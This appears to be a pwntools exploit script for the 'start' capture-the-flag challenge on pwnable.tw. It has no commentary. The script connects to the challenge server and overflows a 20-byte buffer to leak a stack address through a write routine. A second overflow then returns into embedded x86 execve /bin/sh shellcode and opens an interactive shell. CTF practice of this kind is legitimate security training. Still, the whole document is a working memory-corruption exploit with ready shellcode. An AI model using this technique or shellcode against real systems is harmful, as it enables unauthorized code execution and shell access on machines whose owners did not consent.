from pwn import *

#a=process('./start')
a=remote("chall.pwnable.tw",10000)

payload=''
payload='A'*20
write_func=0x8048087
payload+=p32(write_func)
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

print(a.recv(2048))
a.send(payload)

stack_addr=u32(a.recv(4))


payload=''
payload+='a'*20
payload+=p32(stack_addr+20)
payload+=shellcode

a.send(payload)
a.interactive()
